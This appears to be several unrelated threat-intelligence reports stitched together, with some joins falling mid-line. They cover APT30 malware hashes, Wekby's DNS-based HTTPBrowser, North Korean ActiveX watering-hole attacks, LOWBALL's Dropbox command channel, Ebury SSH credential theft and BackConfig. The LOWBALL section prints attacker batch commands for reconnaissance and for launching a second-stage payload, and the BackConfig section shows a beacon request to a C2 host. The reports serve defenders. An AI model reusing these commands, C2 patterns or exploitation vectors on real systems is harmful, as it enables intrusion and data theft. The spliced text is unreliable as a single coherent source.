e39756bc99ee1b05e5ee92a1cdd5faf4 SHIPSHAPE  Below are md5 hash values for a representative sample of APT30 malware. MD5 Hash Malware Family 592381dfa14e61bce089cd00c9b118ae ORANGEADE b493ad490b691b8732983dcca8ea8b6f ORANGEADE b83d43e3b2f0b0a0e5cc047ef258c2cb ORANGEADE 35dfb55f419f476a54241f46e624a1a4 CREAMSICLE 4fffcbdd4804f6952e0daf2d67507946 CREAMSICLE 597805832d45d522c4882f21db800ecf CREAMSICLE 6bd422d56e85024e67cc12207e330984 CREAMSICLE 82e13f3031130bd9d567c46a9c71ef2b CREAMSICLE b79d87ff6de654130da95c73f66c15fa CREAMSICLE 44b98f22155f420af4528d17bb4a5ec8 BACKBEND 6ba315275561d99b1eb8fc614ff0b2b3 BACKBEND ee1b23c97f809151805792f8778ead74 BACKBEND bf8616bbed6d804a3dea09b230c2ab0c GEMCUTTER  APPENDIX C ENDNOTES 1 While binary compile times can be modified or faked, we believe that compile dates for APT30 malware are reliable. Given several hundred malware samples, the compile dates show a fairly regular distribution over the years 2005 – present. In addition, registration dates for the earliest known APT30 domains also support origins dating back to the same time frame.
2 We were able to verify that each file’s icon type (Adobe or Word) was consistent with the letter used (p or w). Although we were only able to identify one malicious document used to deploy a ZRLnk variant (md5 hash d2661543c3c456f5fafdd97e31aaff17), the document type (an RTF file, typically opened by Microsoft Word) was also consistent with the version convention. 3 We did not have conclusive data to interpret the meaning of the last character ‘N’ and ‘Y’, present in some samples. Some evidence suggests that it may represent the inclusion or exclusion of additional malware features, such as the ability to bypass personal firewalls; this appears to be true for at least one variant of BACKSPACE (“Zj Listen”). 4 The use of mutexes and events also supports version control, ensuring that the newer version of the malware executed during the self-update process replaces the previous version.
5 See Appendix A for a detailed description of BACKSPACE malware. 6 While the controller software refers to itself as “NetEagle,” it is used to manage backdoor clients for the malware we call BACKSPACE (also known as “Lecna”). The malware we call NETEAGLE uses a different set of commands and is not compatible with the “NetEagle” controller. In an attempt to avoid confusion, we will refer to the controller as the “BACKSPACE controller,” since it is used to manage BACKSPACE clients. 7 This aligns with early BACKSPACE compile dates of 2005.
8 BACKSPACE samples with md5 hash values acb2ba25ef225d820ac8a5923b746cb8 and c90f798ccfbedb4bbe6c4568e0f05b68 are two examples. 9 Additional paths with slight variations have also been observed in FLASHFLOOD, such as %WINDIR%\$NtUninstallKB885884$. 10 A controller that could be freely copied and distributed would erode the market for future custom software purchases. 11 See Appendix for detailed analysis of both BACKSPACE and NETEAGLE. 12 For example, the BACKSPACE B and Y commands; see Appendix for details.
13 See Appendix for detailed analysis. 14 http://www.asean.org/asean/about-asean 15 http://www.asean.org/news/item/eighteenth-asean-summit-jakarta-7-8-may-2011 16 http://www.asean.org/news/asean-statement-communiques/item/joint-statement-the-seventh-asean-plus-three-labourministers-meeting-7th-almm3-phnom-penh-11-may-2012 17 http://maritimesecurity.asia/free-2/asean-2/asean-china-talk-on-east-sea/ 18 http://www.aseanindia.com/summit-2012/ 19 http://en.wikipedia.org/wiki/List_of_Secretaries-General_of_the_Association_of_Southeast_Asian_Nations 20 http://www.asean.org/news/asean-secretariat-news/item/asean-today-2 21 For the “ZJ Listen” variants, the “Y” vs. “N” in the version number appears to differentiate between variants that attempt to bypass certain host-based firewalls by generating mouse-click events on dialog box buttons. The “Y” variants include this feature; the “N” variants do not. 22 The paths %WINDIR%\$NtUninstallKB900727$ and %WINDIR%\$NtUninstallKB885884$ are used by some variants of the FLASHFLOOD malware, one of three components believed to be used to steal data from air-gapped networks.
23 Two outliers were compiled in May 2011; those samples also used the aseanm.com C2 domain and may have been created to target the 18th ASEAN Summit. 24 CSIDL (constant special item ID list) values are used to identify frequently used folders that may not have the same path on different Windows systems. CSIDL_TEMPLATES corresponds to the folder used to store document templates; for example, C:\Documents and Settings\<username>\Templates. See https://msdn.microsoft.com/en-us/desktop/ bb762494%28v=vs.85%29.aspx for additional detail. 25 The threat actor can provide a target IP address or hostname with the ‘(‘ command.
26 Most “ZJ Listen” samples were compiled on December 31, 2012 and share similar version numbers with the “ZJ Link” samples from April 2013 (e.g., version strings containing Lan2.2Lnk for “ZJ Listen” and F2.2Lnk or F2.3Lnk for “ZJ Link”). 27 http://www.mfa.gov.bt/wp-content/uploads/2013/08/press-release11.pdf 28 Shear, Michael. “White House Urges China to Act on Journalists’ Visas”. Jan 30, 2014. http://www.nytimes.
com/2014/01/31/world/asia/white-house-urges-china-to-act-on-journalists-visas.html 29 BACKSPACE is also known as “Lecna” and may be detected by security vendors by either name – e.g., Backdoor.APT.Lecna. 30 Comparison is generalized; individual samples may vary. 31 The hex representation of each ASCII character is incremented by one. ‘M’ (0x4D) becomes ‘N’ (0x4E), ‘.’ (0x2E) becomes ‘/’ (0x2F), etc. 32 https://msdn.microsoft.com/en-us/library/windows/desktop/aa365740%28v=vs.85%29.aspx 33 Analysis of other BACKSPACE variants suggests that the firewall bypass features may be a modular capability that can be compiled into different versions at will.
Preliminary analysis suggests that version numbers for some BACKSPACE variants may include a “Y” or an “N” to indicate the presence or absence of this feature. 34 Version information is the OSVERSIONINFO struct data returned by a call to GetVersionEx. 35 Analysis of other versions of BACKSPACE showed that Port3 may be used for an interactive remote command shell, but that function was not supported in sample 6ee35da59f92f71e757d4d5b964ecf00. 36 https://msdn.microsoft.com/en-us/library/windows/desktop/aa365740%28v=vs.85%29.aspx 37 Due to limited availability of products localized for languages like Thai, Tagalog, or others used in the Southeast Asia region, English and Chinese would likely be the most common versions used by organizations in that area. 38 The ‘W’ is overwritten by the malware version string.
The version string is 5 bytes including the NULL character. It appears the beacon was intended to have a 4 byte version string. When copying the 2.18\x00, the last \x00 overwrites the ‘W’ character. 39 Persistence may be provided by other files used to retrieve or install NETEAGLE; for example, the MILKMAID/ ORANGEADE droppers create a shortcut file to establish persistence for a second-stage file downloaded by their CREAMSICLE payloads. 40 It is possible that this behavior is configured within the binary at compile time, or has been otherwise modified in this version.
41 SHIPSHAPE determines the disk size by TotalNumberOfBytes returned from GetDiskFreeSpace. The return value is typically the size of the drive or, if quotas are enabled, the value is the size of the quota. 42 Because the copied executables are external to the SHIPSHAPE malware, their content or purpose is unknown. FireEye believes that SHIPSHAPE may be used to copy tools such as SPACESHIP, which could then be transferred (via the removable drive) to another victim computer. 43 The sample f18be055fae2490221c926e2ad55ab11, described here, targets folders and .doc/.docx files, although the sample b249bcf741e076f11b6c9553f6104f16 contains icons for a much broader range of file types within its resource section.
44 These are believed to be directories used by other pieces of the malware ecosystem. The SPACESHIP sample analyzed below references both the \msdn\ and \Recycled\ directories on a removable drive; the FLASHFLOOD sample references \$LDDATA$\ and \Recycled\. 45 Info.txt is used as a log file where information associated with scanning and file information is kept. 46 Likely an updated configuration file. Note the missing \ in the directory path between FoxPro and ld.ini.) 47 The purpose of this activity is unclear.
SENS (the System Event Notification Service) can be used to support mobile computers or computers on high-latency networks. See https://msdn.microsoft.com/en-us/library/windows/desktop/ cc185680%28v=vs.85%29.aspx. 48 See https://msdn.microsoft.com/en-us/library/ms629649%28v=vs.85%29.aspx. 49 See https://msdn.microsoft.com/en-us/library/windows/desktop/ms724284%28v=vs.85%29.aspx. 50 FLASHFLOOD determines the disk size using the TotalNumberOfBytes returned from GetDiskFreeSpace.
The return value is typically the size of the drive or, if quotas are enabled, the value is the size of the quota. 51 Presumably files in these directories were already archived, e.g., when copied to the drive by SPACESHIP. 52 The file “China MFA Press Briefing 29October 2012.doc” (md5 hash f054c0f8c5b4c2a5eb30a16ebe09d8d0) is an example of an exploit document that drops ORANGEADE and the DLL variant of CREAMSICLE. 53 <CSIDL_STARTUP> is a file system directory that corresponds to the user's Startup program group; for example, C:\Documents and Settings\[user]\Start Menu\Programs\Startup under Windows XP or C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup under Vista/Windows 7. 54 Netsvc.exe is presumably an updated backdoor, downloaded if the BACKSPACE mutexes are not found on the victim host.
55 Netsvc.exe is presumably an updated backdoor, downloaded if the BACKSPACE mutex is not found on the victim host. To download this or other FireEye Threat Intelligence reports, visit: www.fireeye.com/reports
(a/k/a TG-0416, APT-18, Dynamite Panda). The Wekby actors have recently been observed compromising organizations in the Manufacturing, Technology and Utilities verticals, but have had a long standing interest in the HealthCare industry.  This campaign uses obfuscated variants of the HTTPBrowser tool that use DNS as a control channel.
This recent campaign exhibits many of the groups key characteristics to deliver a more technically advanced version of their toolkit than has previously been found. The Wekby group is keen on using phishes that purport to be from the IT helpdesk, often with links or attachments claiming to be vpn or citrix upgrades. This specific instance used a “cisco” vpnclient theme.
The Phishing links are: 
hXXp://it-desktop[.]com/vpn/cisco/vpnclient.exe
hXXp://wangke99[.]tgk[.]delldns[.]com/tools.exe
These URIs result in the download of an installer, which creates a PE of the malware typically known as HTTPBrowser, but called Token Control by the Wekby group themselves (based upon the PDB strings found within many of the samples).  The PEBuildDate of the installers range from 2015-06-30 11:57:13 to 12:03:13 UTC. Two samples use subdomains of local.it-desktop.com and were submitted to VirusTotal at 15:32:37 from users in Great Britain. At that time only 8 of 55 AntiVirus engines detected the same as malware, mostly with generic and heuristic detections.  The third sample was first submitted on July 1st 2015 from a user in South Korea.   
The samples install HTTPBrowser at %APPDATA%/wdm.exe. Persistence is established via the HKCUSoftwareMicrosoftWindowsCurrentVersionRun key value for wdm set to the path of the executable. Previous samples have set persistence via Run key values for 360v.
HKCU Run Key for wdm
This tool has been used by a few groups since at least 2012 based upon PEBuildDates). However this sample is a bit more interesting. Normally HTTPBrowser sends traffic over HTTP using a user-agent of HTTPBrowser/1.0.  This sample uses DNS as a covert channel for communications. Specifically this sample utilizes DNS TXT records with 9 uppercase letters followed by a number and 7 more uppercase letters, then the C2 domain used. In this PCAP the C2 domain is glb.it-desktop.com. The "glb" label is believed to be a campaign ID. The other samples use the C2 domains of local.it-desktop.com and hi.getgo2.com
DNS TXT C2
Adding to the intrigue of this sample is a novel form of obfuscation that greatly complicates analysis. Specifically the sample uses Return Oriented Programming to control execution flow, and creates an extraordinary amount of functions filled with instructions that essentially evaluate to elaborate NOPs (no operation).  The way this works is each function modifies the stack to replace the return point with additional functions including a function that includes the next bit of code that needs to be executed. Each subroutine includes the bare minimum number of operations necessary to call another subroutine, or perform local control flow (looping, branching, and simple calculations), before modifying the stack to return to the next subroutine. While looking at a sample in OllyDbg, you would see the following, where execution will continue with Subroutine 0x0040F62E. If that subroutine does not add any additional functions to the stack, execution will continue to Subroutine 0x0040F38A. 
ROP Obfuscation
While many of the Wekby threat actors campaigns may appear unsophisticated because they often rely upon stolen credentials or basic malware, this group of actors is extremely successful at obtaining their objectives. If your organization does not use Two-Factor authentication, the group will typically rely upon stolen credentials for remote access. The Wekby group has exhibited a preference to use a tool named HcdLoader which often persists as a Windows Service on externally facing servers for remote access. The group is particularly skilled at living off the land by using the tools already present on computers for lateral movement and exfiltration.
 
The samples detailed here can be found on VirusTotal at:
d0f79de7bd194c1843e7411c473e4288 
e5414c5215c9305feeebbe0dbee43567 
985eba97e12c3e5bce9221631fb66d68Operation GoldenAxe
IssueMakersLab May 2017
1. Overview
For about a year from June 2016 to May 2017, the estimated power of North Korea has been involved in South Korea’s 10 more organization’s websites related to diplomacy, space aviation, North Korea, unification, parliamentary, labor, finance, etc.
A Watering hole attack was conducted to distribute malware to visitors through. As direct attacks against institutions and businesses in the field became increasingly difficult, they conducted an attack against a relatively easy association compliant, and conducted a bypass penetration.
Infection vector used program was ActiveX programs from 10 domestic software, including electronic payments, authentication, encryption, reporting, webmail and groupware, to infect visitors in their respective fields. Some ActiveX programs have been installed on the PCs of many users in the country, and they distributed the malware using a vulnerability in zero day vulnerability where no patches existed at the time of distributing the malware. It was also able to distribute malwares without being detected for a long time by only distributing them for a very short period of time or identifying and distributing specific users.
The malwares were similar to those that were distributed to South Korean security agencies and large South Korean companies, which police and prosecutors concluded in 2016 were respectively responsible for North Korea. There is also a connection with malwares used in the South's ATM hacking scandal, which is suspected of being committed by North Korea but has yet to be closed. In addition, during the time of the North Korea's March 20 attack against broadcast and financial hacking (2013) incident, ActiveX vulnerabilities of the South Korean financial security module were used to infiltrate the agencies for several months, resulting in secondary damage called hard disk destruction. With this so called " Operation GoldenAxe”, it is expected to reach further damage.
2. Target
2.1. Web sites for distributing malware
The following 10 Web sites were hacked and malwares were distributed to visitors.
hxxp://www[.]kcfr[.]or[.]kr	The Korea Foreign Affairs Association
hxxp://www[.]ksas[.]or[.]kr	Aerospace Research Institute
hxxp://www[.]nksis[.]com	North Korean Strategic Information Service Center
hxxp://www[.]tongzun[.]co.kr	A group of North Korean defectors preparing for reunification
hxxp://www[.]tongiledu[.]org	Unification Education Council
hxxp://kuprp[.]nodong[.]net	National Union of Public Research Workers
hxxp://ampcc[.]go[.]kr	The National Council of Councils
hxxp://www[.]wblu[.]or[.]kr	Woori Bank Branch
hxxp://newanticancer[.]com	Sindaeam Hospital
hxxp://www[.]rokps[.]or[.]kr	Hunjeonghoe of South Korea (former lawmaker)
2.2. ActiveX programs used to distribute malware
The following 10 ActiveX programs were used to distribute malware.
Some ActiveX vulnerabilities used in the dissemination were exploited by zero-day vulnerabilities, with no patches present at the time of the spread of malwares.
In particular, ActiveX zero-day vulnerabilities in M2Soft's reporting solution were used in June 2016 for an organization, and were again used to distribute the malware of North Korea.
EasyPayPlugin.EPplugin.1	EasyPay Electronic Payment Plug-in Module
MagicLoaderX.MagicLoaderX.1	Dream Security MagicloaderX Authentication Plug-in Modul
NVERSIONMAN.NVersionManCtrl.1	Nanoom Groupware Smart Flow NVersionMan Module
admctrl.FileIO.1	Dream Security Administrator Privilege Processing Component Modul
RDVistaSupport.VistaSupport.1	M2 Soft Reporting Solution Report Designer Module
JxVistaDll.JXVistaUtil.1	Soft 25 Zone Encryption Solution JX - CEAL Vista Module
JXFILEBOX.JxFileBoxCtrl.1	Soft 25 JXFILEBOX Module
JXORGTREE.JXOrgTreeCtrl.1	Soft25 Webmail JXMAIL Module
INIWALLET61.INIwallet61Ctrl.1	INISYS INIWALLET Browser extension module
INIUPDATER.INIUpdaterCtrl.1	Initec INISAFE Encryption Solution Update Module
3. Malware distributed (malware by North Korea)
A number of malwares have been circulated, which are similar to malwares those were said to be attributed by North Korea from the investigation report of the Prosecutor’s Office and National Police Office.
malwares allow users to remotely control their PCs to steal information or transmit additional malwares.
3.1. Similar to the malware used for hacking to South Korea’s large enterprise group
(Source: S. Korea’s National Police Office)
The malware on the left of the picture below is malware that was announced by the police as North Korean made, and the malware on the right was distributed in the Operation GoldenAxe. Unique Encryption/Decryption logic used in malware is identical. Other malwares found the same part of the protocol used to control & command.
3.2. Similar to malware used for hacking of S. Korea’s Security Software Companies (Source: S. Korea’s Prosecutor’s Office)

The malware at the top of the picture below is malware that was announced by the S. Korean Prosecutor’s Office as the act of North Korea. Two malwares use the same Encryption/Decryption method and has the same C&C command system. 

When the above two malwares are decoded, the same C&C command system is used as follows.

3.3. Connected to malware found in S. Korea’s ATM hacking (suspected North Korean actions)
The C&C server address used in the incident targeting The National Council on Public Relations (hxxp://ampcc[.]go[.]kr) that distributed malwares during this Operation GoldenAxe corresponds to that of code found in the ATM hacking incident in Korea.
4. Comments/Response
North Korea is mainly using zero-day vulnerabilities in the ActiveX program of South Korean software. ActiveX is a common use by local organizations, companies, and others, and many are installed on the local users ' PCs. Also, finding an ActiveX vulnerability is fairly easy compared to other software programs, making it the best weapon for North Korea to use in an attack spreading malware. In particular, the March 20 attack in 2013, which was found to have been committed by North Korea, was infiltrated by the vulnerability of ActiveX financial security module, which is widely used in South Korea. In the current situation where it is difficult to penetrate directly as major organizations and companies have increased security due to frequent cyberattack from North Korea, the agency and its employees are infected through associations and associations.
Therefore, it is necessary to refrain from using ActiveX, which is relatively vulnerable to security.FireEye Intelligence CenterFireEye Threat Intelligence analysts identified a spear phishing campaign carried out in August 2015 targeting Hong Kong-based media organizations. A China-based cyber threat group, which FireEye tracks as an uncategorized advanced persistent threat (APT) group and other researchers refer to as “admin@338,” may have conducted the activity.[1] The email messages contained malicious documents with a malware payload called LOWBALL. LOWBALL abuses the Dropbox cloud storage service for command and control (CnC). We collaborated with Dropbox to investigate the threat, and our cooperation revealed what may be a second, similar operation. The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3]
A Cyber Campaign Likely Intended to Monitor Hong Kong Media During a Period of Crisis
The threat group has previously used newsworthy events as lures to deliver malware.[4] They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.[5]
The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China. The threat group’s latest activity coincided with the announcement of criminal charges against democracy activists.[6] During the past 12 months, Chinese authorities have faced several challenges, including large-scale protests in Hong Kong in late 2014, the precipitous decline in the stock market in mid-2015, and the massive industrial explosion in Tianjin in August 2015. In Hong Kong, the pro-democracy movement persists, and the government recently denied a professor a post because of his links to a pro-democracy leader.[7]
Multiple China-based cyber threat groups have targeted international media organizations in the past. The targeting has often focused on Hong Kong-based media, particularly those that publish pro-democracy material. The media organizations targeted with the threat group’s well-crafted Chinese language lure documents are precisely those whose networks Beijing would seek to monitor. Cyber threat groups’ access to the media organization’s networks could potentially provide the government advance warning on upcoming protests, information on pro-democracy group leaders, and insights needed to disrupt activity on the Internet, such as what occurred in mid-2014 when several websites were brought down in denial of service attacks.[8]
Threat Actors Use Spear Phishing Written in Traditional Chinese Script in Attempted Intrusions
In August 2015, the threat actors sent spear phishing emails to a number of Hong Kong-based media organizations, including newspapers, radio, and television. The first email references the creation of a Christian civil society organization to coincide with the anniversary of the 2014 protests in Hong Kong known as the Umbrella Movement. The second email references a Hong Kong University alumni organization that fears votes in a referendum to appoint a Vice-Chancellor will be co-opted by pro-Beijing interests.[9]
Figure 1: Lure screenshots
The group’s previous activities against financial and policy organizations have largely focused on spear phishing emails written in English, destined for Western audiences. This campaign, however, is clearly designed for those who read the traditional Chinese script commonly used in Hong Kong.
LOWBALL Malware Analysis
The spear phishing emails contained three attachments in total, each of which exploited an older vulnerability in Microsoft Office (CVE-2012-0158):
MD5
Filename
b9208a5b0504cb2283b1144fc455eaaa
使命公民運動 我們的異象.doc
ec19ed7cddf92984906325da59f75351
新聞稿及公佈.doc
6495b384748188188d09e9d5a0c401a4
(代發)[采訪通知]港大校友關注組遞信行動.doc
In all three cases, the payload was the same:
MD5
Filename
d76261ba3b624933a6ebb5dd73758db4
time.exe
This backdoor, known as LOWBALL, uses the legitimate Dropbox cloud-storage
service to act as the CnC server. It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and
execute files. The communication occurs via HTTPS over port 443.
After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:
MD5
Filename
d76261ba3b624933a6ebb5dd73758db4
WmiApCom
79b68cdd0044edd4fbf8067b22878644
WmiApCom.bat
The “WmiApCom.bat” file is simply used to start “WmiApCom”, which happens to be the exact same file as the one dropped by the malicious Word documents. However, this is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.
The threat group monitors its Dropbox account for responses from compromised computers. Once the LOWBALL malware calls back to the Dropbox account, the attackers will create a file called “[COMPUTER_NAME]_upload.bat” which contains commands to be executed on the compromised computer. This batch file is then executed on the target computer, with the results uploaded to the attackers’ Dropbox account in a file named “[COMPUTER_NAME]_download”.
We observed the threat group issue the following commands:
@echo off 
 dir c:\ >> %temp%\download 
 ipconfig /all >> %temp%\download 
 net user >> %temp%\download 
 net user /domain >> %temp%\download 
 ver >> %temp%\download 
 del %0  
@echo off 
 dir "c:\Documents and Settings" >> %temp%\download 
 dir "c:\Program Files\ 
 " >> %temp%\download 
 net start >> %temp%\download 
 net localgroup administrator >> %temp%\download 
 netstat -ano >> %temp%\download
These commands allow the threat group to gain information about the compromised computer and the network to which it belongs. Using this information, they can decide to explore further or instruct the compromised computer to download additional malware.
We observed the threat group upload a second stage malware, known as BUBBLEWRAP (also known as Backdoor.APT.FakeWinHTTPHelper) to their Dropbox account along with the following command:
@echo off 
 ren "%temp%\upload" audiodg.exe 
 start %temp%\audiodg.exe 
 dir d:\ >> %temp%\download 
 systeminfo >> %temp%\download 
 del %0  
We have previously observed the admin@338 group use BUBBLEWRAP. This particular sample connected to the CnC domain accounts.serveftp[.]com, which resolved to an IP address previously used by the threat group, although the IP had not been used for some time prior to this most recent activity:
MD5
 
 
0beb957923df2c885d29a9c1743dd94b
accounts.serveftp.com
59.188.0.197
BUBBLEWRAP is a full-featured backdoor that is set to run when the system boots, and can communicate using HTTP, HTTPS, or a SOCKS proxy. This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities.
A Second Operation
FireEye works closely with security researchers and industry partners to mitigate cyber threats, and we collaborated with Dropbox to respond to this activity. The Dropbox security team was able to identify this abuse and put countermeasures in place.
Our cooperation uncovered what appears to be a second, ongoing operation, though we lack sufficient evidence to verify if admin@338 is behind it. The attack lifecycle followed the same pattern, though some of the filenames were different, which indicates that there may be multiple versions of the malware. In addition, while the operation targeting Hong Kong-based media involved a smaller number of targets and a limited duration, we suspect this second operation involves up to 50 targets. At this time, we are unable to identify the victims.
In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account. The malware beacons to this directory using the hardcoded API token and attempts to download these files (which are deleted from the Dropbox account after the download):
upload.bat, a batch script that the compromised machine will execute
upload.rar, a RAR archive that contains at least two files: a batch script to execute, and often an executable (sometimes named rar.exe)  which the batch script will run and almost always uploads the results of download.rar to the cloud storage account
silent.txt and period.txt,  small files sizes of 0-4 bytes that dictate the frequency to check in with the CnC
The threat actor will then download the results and then delete the files from the cloud storage account.
Conclusion
LOWBALL is an example of malware that abuses cloud storage services to mask its activity from network defenders. The LOWBALL first stage malware allows the group to collect information from victims and then deliver the BUBBLEWRAP second stage malware to their victims after verifying that they are indeed interesting targets.
A version of this article appeared first on the FireEye Intelligence Center. The FireEye Intelligence Center provides access to strategic intelligence, analysis tools, intelligence sharing capabilities, and institutional knowledge based on over 10 years of FireEye and Mandiant experience detecting, responding to and tracking advanced threats. FireEye uses a proprietary intelligence database, along with the expertise of our Threat Intelligence Analysts, to power the Intelligence Center.Introduction Windigo has been a long-standing adversary of the Research & Education community. The first known attack dates back to 2011, when the Ebury malware was discovered during the Linux Foundation attack in 2011 external link. A technical paper describing the attacks in-depth was published in 2014 by ESET: "Operation Windigo" external link. After the arrest and conviction external link of one of the key attackers, our community observed a sharp drop in the number of infections. Sporadic Ebury infections continued to be observed in other sectors and led to another update from ESET: Windigo Still not Windigone: An Ebury Update external link. A lot could be learnt from the attacks to better protect our community, for example to detect OpenSSH backdoors external link.
Unfortunately, dozens of Linux servers were discovered compromised again in the Research & Education community in May 2019, all running new and improved versions of Ebury.
Ebury malware The Ebury malware samples detected in May 2019 appear to be evolutions of the malicious code from 2014 and 2017. The technical documents referenced in the introduction remain largely valid. In a nutshell, the Ebury malware replaces legitimate dynamic libraries (e.g. libkeyutils.so) in the affected system to capture SSH passwords and SSH keys. When executed:
The infected dynamic library will load a secondary malicious dynamic library (e.g. libstz.so), containing the actual malicious code; Malicious hooks and a specific OpenSSH server configuration are pushed within the running OpenSSH server binary to accomodate the capture of credentials and backdoor functionality; A malicious process is forked and dedicated to the extraction of credentials; The two malicious processes communicate via an abstract unix socket. Ebury backdoor Ebury uses a complex backdoor mechanism described in the technical documents referenced in the introduction. In the samples collected in May 2019, the authentication part of the backdoor was updated and reinforced. Nevertheless, the attacker seem to continue to connect daily to infected hosts and exfiltrate the credentials using known techniques.
Indicators of compromises Network: Backdoor connections The attacker is known to use direct incoming SSH connections to the victims OpenSSH server. The backdoor connection will be regular SSH connections, with two notable exceptions:
The SSH client string will be different: SSH-2.0-XXXXXXXXXXXXXXX, where XXXXXXXXXXXXXXX will either be a Hex number (Ebury < 1.7.0) or Base64 string (Ebury >= 1.7.0); The string is an encrypted message for the backdoor. It can be decoded based on the incoming IP address used by the attacker; Logging all incoming SSH client versions using network monitoring tools is very helpful. Example malicious strings from incoming IP address 80.82.67.21: SSH-2.0-1f25412f1c4d340d173f003a35150d5734111a5562471c.
Backdoor connections (incoming SSH) may be observed form the following IP addresses:
94.140.120.163 49.50.70.223 80.82.67.21 125.160.17.32 It is essential to monitor the SSH client version string. Network: Password exfiltration The SSH client string is decrypted by the client to reveal the credentials exfiltration IP address that needs to be used by the malware. Both the SSH client string and the incoming IP address are needed to decrypt the malicious command and exfiltration IP address.
The exfiltration IP address is used by the malware to exfiltrate captured credentials as a outgoing DNS request (UDP:53). The following IP address has been identified as the exfiltration (outgoing UDP:53) host: 91.236.116.62
Additional exfiltration methods are described in the technical documents referenced in the introduction. In particular, the malware also relies on a DGA, and the attacker seems to have prepared the following domains:
larfj7g1vaz3y.net / 78.140.134.7. op3f1libgh.biz / 193.0.179.76. These domains are actively maintained by the attacker. However, no known affected host has been observed using this exfiltration path in the current attack. Host-based indicators The easiest way to inspect the OpenSSH server for signs of infection is to verify the dynamic libraries in use. In particular, libkeyutils.so.* will typically have a single link to libc.so. Note that the malware uses different library filenames (e.g. libsbz.so, libstz.so, etc.). For example, on an infected system:
# objdump -x /lib64/libkeyutils.so.1|grep NEEDED NEEDED libc.so.6 NEEDED libstz.so This indicates that libkeyutils.so.1 has been infected and will call Ebury from libstz.so. This contrasts with a clean system:
# objdump -x /lib64/libkeyutils.so.1 |grep NEEDED NEEDED libc.so.6 Due to code errors in the malware, it is also common to discover segfault messages in the kernel logs, for example:
Jun 04 09:01:03 hostname kernel: sshd[12345]: segfault at 7fcf794b8000 ip 00007fcf792a50b8 sp 00007fffb6b8e0e0 error = The malicious abstract unix socket may also be identified by running the following command:
# lsof |grep "@/run" Note: as it is an abstract socket, it is not possible to find it on the filesystem.
Responding to the attack The attack is relying on stolen SSH credentials in our highly interconnected community. Therefore the initial infection vector is often a valid SSH login from a valid user from a known location.
As a result, collaboration between the affected organizations is absolutely crucial. Responding to this attack extensively relies on victims reporting attacks and contributing new malicious samples, and sharing back with the community.Executive Summary
Unit 42 has observed activity over the last 4 months involving the BackConfig malware used by the Hangover threat group (aka Neon, Viceroy Tiger, MONSOON). Targets of the spear-phishing attacks, using local and topical lures, included government and military organizations in South Asia. The BackConfig custom trojan has a flexible plug-in architecture for components offering various features, including the ability to gather system and keylog information and to upload and execute additional payloads. The initial infection occurs via a weaponized Microsoft Excel (XLS) document delivered via compromised legitimate websites for which the URLs are most likely shared via email. The documents use Visual Basic for Applications (VBA) Macro code which, if enabled by the victim, starts an installation process consisting of multiple components that result in the plug-in loader payload being downloaded and executed. The modular nature certainly allows for quicker changes to individual components and, perhaps more importantly for the attackers, splits up the malicious behaviors in such a way that could thwart sandbox and dynamic analysis systems, especially when analyzing the components in isolation.

Our threat prevention platform with WildFire detects activity associated with this threat group, while simultaneously updating the ‘malware’ category within the PAN-DB URL filtering solution for malicious and/or compromised domains that have been identified. Indicators of compromise related to this research are documented at the end of this report and in the Adversary Playbook for the Hangover threat group that can be accessed in the Unit 42 Playbook Viewer. Starting Point
Unit 42 first saw activity involving the Windows PE executable file (SHA256: 84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c) when searching AutoFocus data related to particular sectors and countries of interest. The file was first seen on January 19th, 2020, having been downloaded by two organizations -- a government department in one country and a military organization in another -- within minutes of each other. The source of the download was http://212.114.52[.]148/request/httpsrequest and the file httpsrequest was stored locally as dphc.exe. More details on how the malware was delivered are described later in the blog.

The choice of terminology in URL paths and file names when delivering BackConfig malware in this, and other campaigns discussed later on, is clearly to blend in as benign operations, paths and filenames. Although spelled differently, it could be easy to believe the payload relates to the DHCP networking service. The purpose of this malware is to allow the actors to download and execute an executable file, as well as download and run batch files to run commands on the end system. This sample has a custom "decryption" routine that subtracts six from each character. The following strings are decrypted using this method:

linkrequest[.]live
\\Adobe\\Driver\\dwg\\pid.txt
\\Adobe\\Driver\\dwg\\
\\Adobe\\Driver\\dwg\\wuaupdt.exe
The Trojan reads the following file to use in the URL of the C2 beacon. If the file does not exist, the executable will exit without performing any further activities. The pid.txt file is created during the earlier delivery and installation phases starting with the weaponized Excel document.

More information about this setup process is covered later in the delivery section. As previously mentioned, this behavior makes an automated analysis of the individual executable payload component harder. %USERPROFILE%\Adobe\Driver\dwg\pid.txt
The C2 channel uses HTTPS thanks to the INTERNET_FLAG_SECURE flag used when calling the HttpOpenRequestA function. The beacon HTTP request will look like the following:

GET /orderme/[contents of pid.txt file] HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 @/NEW
Host: linkrequest[.]live [resolving to 23.106.123[.]87]

The Trojan will look for the following field and values within the HTTP response header:

"Content-Type: application"
"Content-Type: xDvsds"
"Content-Type: Bw11eW"
If the content-type field contains a value of application, the Trojan will extract a filename from the HTTP response headers between the string filename and Content-Transfer-Encoding. It will use this filename to create a file in the %USERPROFILE%\Adobe\Driver\dwg\ folder, which it will write the data in the HTTP response to. Based on the other two Content-Types, we believe the filename provided will be either "wuaupdt.exe" or test.bat.

If the content-type field has a value of xDvsds, the Trojan will attempt to execute the following file using ShellExecuteA and the "open" method:

%USERPROFILE%\Adobe\Driver\dwg\wuaupdt.exe

If the content-type field has a value of Bw11eW, the Trojan will attempt to execute the following file using ShellExecuteA and the "open" method:

%USERPROFILE%\Adobe\Driver\dwg\test.bat

